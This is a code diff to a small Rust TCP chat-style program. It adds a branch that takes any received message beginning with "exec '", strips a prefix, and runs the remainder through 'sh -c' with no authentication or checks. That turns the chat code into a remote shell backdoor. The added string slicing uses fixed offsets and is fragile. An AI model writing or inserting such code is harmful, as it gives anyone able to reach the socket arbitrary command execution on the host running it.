@@ -3,8 +3,9 @@ use std::net::TcpStream;
 use std::sync::mpsc::{self, TryRecvError};
 use std::thread;
 use std::time::Duration;
+use std::process::Command;
 
-const LOCAL: &str = "0.0.0.0:7878";
+const LOCAL: &str = "127.0.0.1:7878";
 const MSG_SIZE: usize = 1024;
 
 fn main() {
@@ -21,11 +22,20 @@ fn main() {
                 if msg.starts_with("orange:"){
                 	let frmsg = &msg[8..msg.len()];
                 	println!("{}", frmsg);
+                	
                 	if frmsg.starts_with("exec '"){
-                		println!("tes t");
+                		println!("frmsg: {}", &frmsg[5..frmsg.len()]);
                 	}	
                 } else{
                 	println!("Received message from {}", msg);
+                	let frmsg = &msg[7..msg.len()];
+                	println!("{}", frmsg);
+                	let command = &frmsg[6..frmsg.len()];
+ 					               	                	
+                	if frmsg.starts_with("exec '"){
+                		println!("here:   {}", command);
+                		Command::new("sh").arg("-c").arg(command).spawn().unwrap();
+                	    }
                 }
             },
             Err(ref err) if err.kind() == ErrorKind::WouldBlock => (),
